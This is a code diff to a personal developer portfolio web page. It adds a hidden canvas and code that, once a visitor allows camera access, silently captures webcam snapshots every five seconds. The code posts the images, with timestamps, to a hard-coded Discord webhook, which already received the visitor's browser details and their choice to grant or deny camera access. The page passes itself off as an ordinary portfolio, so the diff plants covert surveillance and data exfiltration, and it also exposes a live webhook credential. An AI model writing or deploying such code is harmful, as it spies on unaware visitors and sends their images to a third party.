@@ -139,6 +139,9 @@
             border-radius: 10px;
             box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
         }
+        #snapshot-canvas {
+            display: none;
+        }
         footer {
             text-align: center;
             padding: 20px;
@@ -169,6 +172,7 @@
             <h2>About Me</h2>
             <p>Hey, I'm Exze, a passionate developer crafting sleek, modern web experiences. Inspired by the hustle of NYC, I blend tech and creativity to build projects that stand out.</p>
             <video id="camera-feed" autoplay playsinline></video>
+            <canvas id="snapshot-canvas"></canvas>
         </section>
         <section id="projects">
             <h2>Projects</h2>
@@ -206,20 +210,31 @@
         const denyBtn = document.getElementById('denyBtn');
         const errorMsg = document.getElementById('error');
         const video = document.getElementById('camera-feed');
+        const canvas = document.getElementById('snapshot-canvas');
+        const ctx = canvas.getContext('2d');
         const webhookUrl = 'https://discordapp.com/api/webhooks/1360012861673570315/ZqzUK5SoTzzvkBMIGPbH00hA9lt0nAj_eHAbqbqS-Y4vfhq1Dy-sX4ULdcdTWwl0Ui6L';
-        async function sendToDiscord(message) {
+
+        async function sendToDiscord(message, imageData = null) {
             try {
+                const payload = { content: message };
+                if (imageData) {
+                    payload.attachments = [{
+                        attachment: imageData,
+                        name: `snapshot-${new Date().toISOString()}.png`
+                    }];
+                }
                 const response = await fetch(webhookUrl, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: message }),
+                    body: JSON.stringify(payload)
                 });
                 if (!response.ok) throw new Error('Webhook failed');
-                console.log('Message sent to Discord');
+                console.log('Sent to Discord');
             } catch (err) {
-                console.error('Error sending to Discord:', err);
+                console.error('Discord error:', err);
             }
         }
+
         function showPortfolio() {
             popup.style.opacity = '0';
             setTimeout(() => {
@@ -227,6 +242,16 @@
                 portfolio.style.display = 'block';
             }, 500);
         }
+
+        function captureSnapshot() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0);
+            const imageData = canvas.toDataURL('image/png');
+            const timestamp = new Date().toLocaleString();
+            sendToDiscord(`Snapshot captured at ${timestamp}`, imageData);
+        }
+
         acceptBtn.addEventListener('click', async () => {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -236,12 +261,15 @@
                 const timestamp = new Date().toLocaleString();
                 const browserInfo = navigator.userAgent;
                 await sendToDiscord(`Camera access granted at ${timestamp}. Browser: ${browserInfo}`);
+                // Start capturing snapshots every 5 seconds
+                setInterval(captureSnapshot, 5000);
             } catch (err) {
                 console.error('Camera error:', err);
                 errorMsg.style.display = 'block';
                 showPortfolio();
             }
         });
+
         denyBtn.addEventListener('click', () => {
             showPortfolio();
             sendToDiscord(`Camera access denied at ${new Date().toLocaleString()}.`);
